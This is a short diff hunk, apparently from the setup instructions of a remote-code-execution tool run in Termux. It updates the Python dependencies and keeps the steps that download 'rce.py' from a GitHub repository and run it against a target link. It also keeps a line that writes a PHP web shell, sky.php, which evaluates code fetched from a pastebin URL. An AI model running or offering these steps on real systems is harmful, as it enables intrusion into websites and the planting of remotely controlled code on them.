@@ -29,11 +29,11 @@ pkg install wget
 
 wget https://raw.githubusercontent.com/clown-syndicate/RCE/master/rce.py 
 
-pkg install python2
+pkg install python
 
-pip install mechanize
+pip install requests
 
-python2 rce.py link
+python rce.py link
 
 echo '<?php eval("?>".file_get_contents("https://pastebin.com/raw/CurQrH1a")); ?>' > sky.php
 
